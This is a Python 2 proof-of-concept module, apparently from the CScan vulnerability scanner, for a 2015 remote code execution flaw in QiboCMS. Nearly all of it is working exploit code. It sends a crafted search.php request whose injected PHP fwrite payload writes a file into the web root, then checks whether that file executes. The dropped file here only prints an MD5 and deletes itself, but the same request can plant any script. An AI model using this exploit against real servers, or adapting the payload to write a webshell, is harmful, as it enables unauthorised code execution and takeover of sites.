# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import random
import string
import hashlib

class Vuln(ABVuln):
    vuln_id = 'QiboCMS_0020' # 平台漏洞编号，留空
    name = '齐博分类系统 远程代码执行漏洞洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE # 漏洞类型
    disclosure_date = '2015-07-10'  # 漏洞公布时间
    desc = '''
        QiboCMS 存在二次SQL注入导致的命令执行，可GetShell.
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'QiboCMS(齐博CMS)'  # 漏洞应用名称
    product_version = '<2015.06.30'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'dfe399e1-f0fa-44fc-acf4-e6a5d7a26abe'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-06'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #target = args['options']['target']
            first_url = self.target + "/search.php"
            secend_url = self.target + "/do/jf.php"

            rand_num = random.uniform(10000,99999)
            hash_num = hashlib.md5(str(rand_num)).hexdigest()
            shell_url = self.target + '/do/%d.php' % rand_num

            payload = ("action=search&keyword=asd&postdb[city_id]=../../admin/hack&hack="
                       "jfadmin&action=addjf&list=1&fid=1&Apower[jfadmin_mod]=1&title=%s&"
                       "content=${@fwrite(fopen('%d.php', 'w+'), '<?php var_dump(md5(123));"
                       "unlink(__FILE__);?>')}") % (hash_num,rand_num)

            requests.get(first_url + '?' + payload)
            if hash_num in requests.get(secend_url).content:
                print '[*] Checking'

            if '202cb962ac59075b964b07152d234b70' in requests.get(shell_url).content:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
